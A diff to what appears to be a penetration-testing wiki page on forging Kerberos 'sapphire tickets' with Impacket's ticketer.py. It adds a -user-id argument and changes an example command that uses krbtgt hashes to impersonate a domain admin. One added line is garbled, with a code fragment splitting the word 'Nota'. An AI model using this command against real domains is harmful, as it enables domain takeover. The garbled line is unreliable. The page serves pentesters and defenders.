@@ -16,16 +16,17 @@ The powerful user's PAC can be obtained through an [S4U2self+u2u](../) trick.
 {% tab title="UNIX-like" %}
 From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s [ticketer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) (Python) script can be used for such purposes with the `-impersonate` argument.
 
-_As of September 25th, 2022, this feature is in a pull request (_[_#1411_](https://github.com/SecureAuthCorp/impacket/pull/1411)_) awaiting to be merged. Nota bene: both the nthash and aeskey must be supplied._
+_As of September 11th, 2023, this feature is in a pull request (_[_#1411_](https://github.com/SecureAuthCorp/impacket/pull/1411)_) awaiting to be merged. No_`user-id`_ta bene 1: both the nthash and aeskey must be supplied._\
+_Nota bene 2: the `-user-id` argument will be used to build the "Requestor" PAC structure, which could be needed in up-to-date environments (see warning at the bottom of this page)._
 
-The arguments used to customize the PAC will be ignored (`-groups`, `-user-id`, `-extra-sid`,`-duration`), the required domain SID (`-domain-sid`) as well as the username supplied in the positional argument (`baduser` in this case). All these information will be kept as-is from the PAC obtained beforehand using the [S4U2self+u2u](../) trick.
+The arguments used to customize the PAC will be ignored (`-groups`, `-extra-sid`,`-duration`), the required domain SID (`-domain-sid`) as well as the username supplied in the positional argument (`baduser` in this case). All these information will be kept as-is from the PAC obtained beforehand using the [S4U2self+u2u](../) trick.
 
 {% code overflow="wrap" %}
 ```bash
 ticketer.py -request -impersonate 'domainadmin' \
 -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' \
 -nthash 'krbtgt NT hash' -aesKey 'krbtgt AES key' \
--domain-sid 'S-1-5-21-...' \
+-user-id '1115' -domain-sid 'S-1-5-21-...' \
 'baduser'
 ```
 {% endcode %}
